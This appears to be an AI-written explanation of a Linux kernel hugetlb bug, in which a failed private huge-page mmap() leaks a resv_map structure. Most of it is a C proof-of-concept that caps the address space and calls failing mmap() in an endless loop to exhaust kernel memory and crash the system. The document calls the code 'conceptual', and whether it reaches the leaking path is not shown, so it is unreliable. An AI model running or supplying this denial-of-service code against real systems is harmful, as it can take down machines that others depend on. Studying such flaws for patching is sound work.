Based on the vulnerability's description, an exploit or Proof-of-Concept (PoC) would involve repeatedly calling the `mmap()` system call with flags that trigger the allocation of private huge pages (`MAP_HUGETLB | MAP_PRIVATE`) in a way that causes the call to fail.

The vulnerability exists because when `mmap()` fails after `hugetlb_reserve_pages()` has already allocated a `resv_map`, the error-handling path does not call the corresponding `vm_ops->close` handler (`hugetlb_vm_op_close`), leading to a memory leak of the `resv_map` structure. An attacker can repeat this process to exhaust kernel memory, causing a denial-of-service (system crash).

While a specific PoC is not provided in the context, a conceptual example would look like this:

```c
#include <sys/mman.h>
#include <unistd.h>
#include <sys/resource.h>
#include <stdio.h>

// A typical huge page size, but should be determined dynamically.
#define HUGE_PAGE_SIZE (2 * 1024 * 1024)

int main() {
    struct rlimit rlim;

    // Set a low memory limit to easily trigger mmap failures.
    rlim.rlim_cur = HUGE_PAGE_SIZE * 10;
    rlim.rlim_max = HUGE_PAGE_SIZE * 10;
    if (setrlimit(RLIMIT_AS, &rlim) != 0) {
        perror("setrlimit");
        return 1;
    }

    printf("Attempting to trigger memory leak by repeatedly calling failing mmap...\n");

    // Loop indefinitely to cause the kernel memory leak.
    while (1) {
        void *addr = mmap(NULL, HUGE_PAGE_SIZE, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);

        if (addr == MAP_FAILED) {
            // This is the expected path that triggers the leak.
            // A small delay might be useful to avoid making the system
            // instantly unresponsive.
            usleep(10000);
        } else {
            // If mapping succeeds, unmap it and continue.
            munmap(addr, HUGE_PAGE_SIZE);
        }
    }

    return 0;
}
